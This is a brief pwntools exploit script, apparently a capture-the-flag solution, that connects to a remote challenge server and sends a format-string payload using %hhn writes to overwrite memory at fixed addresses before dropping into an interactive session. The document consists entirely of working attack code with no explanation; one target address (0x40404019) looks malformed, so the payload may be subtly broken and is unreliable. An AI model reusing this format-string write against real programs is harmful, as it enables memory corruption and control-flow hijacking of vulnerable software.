from pwn import *

base = 8

#p=process('./p')
p=remote('shell.actf.co',19011)

fmt = '%17c%12$hhn%165c%13$hhn'.ljust(0x20)+p64(0x40404019)+p64(0x404018)
pause()
p.sendline(fmt)
p.interactive()

